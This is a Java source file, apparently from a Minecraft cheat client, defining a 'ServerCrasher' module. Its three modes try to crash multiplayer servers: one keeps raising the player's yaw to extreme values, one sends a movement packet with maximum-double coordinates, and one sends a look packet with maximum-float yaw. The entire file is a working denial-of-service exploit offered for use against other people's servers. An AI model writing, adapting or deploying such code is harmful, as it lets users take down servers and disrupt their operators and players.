package dev.southside.module.impl.misc;

import cc.polyfrost.oneconfig.config.options.impl.Dropdown;
import cc.polyfrost.oneconfig.config.options.impl.Slider;
import dev.southside.Southside;
import dev.southside.event.Stage;
import dev.southside.event.events.MotionEvent;
import dev.southside.module.Category;
import dev.southside.module.Module;
import dev.southside.orbit.EventHandler;
import dev.southside.utils.misc.ClientUtils;
import net.minecraft.util.math.Vec3d;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.LookAndOnGround;

public class ServerCrasher extends Module {
   public Dropdown mode = new Dropdown("Mode", "HighYaw", "HighYaw", "FarPosition", "InfYaw");
   public Slider incment = new Slider("Yaw Increment", 1000, 100, 1000000, 100);
   float yaw = 0.0F;

   public ServerCrasher() {
      super(Category.Misc, "ServerCrasher", "Crashes the server");
   }

   @EventHandler
   public void onMotion(MotionEvent event) {
      if (event.getState() == Stage.PRE && this.mode.isMode("HighYaw")) {
         this.yaw = this.yaw + this.incment.getValue().floatValue();
         event.setYaw(this.yaw);
         event.setModified(true);
      }
   }

   @Override
   public void onEnable() {
      if (!ClientUtils.nullCheck()) {
         this.yaw = mc.player.getYaw();
         if (this.mode.isMode("FarPosition")) {
            Vec3d pos1 = new Vec3d(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
            mc.player
               .networkHandler
               .sendPacket(new PositionAndOnGround(pos1.x, pos1.y, pos1.z, mc.player.isOnGround(), mc.player.horizontalCollision));
         }

         if (this.mode.isMode("InfYaw")) {
            mc.player
               .networkHandler
               .sendPacket(new LookAndOnGround(Float.MAX_VALUE, mc.player.getPitch(), mc.player.isOnGround(), mc.player.horizontalCollision));
         }

         if (!this.mode.isMode("HighYaw")) {
            Southside.get().getModuleManager().get(ServerCrasher.class).setEnable(false);
         }
      }
   }
}
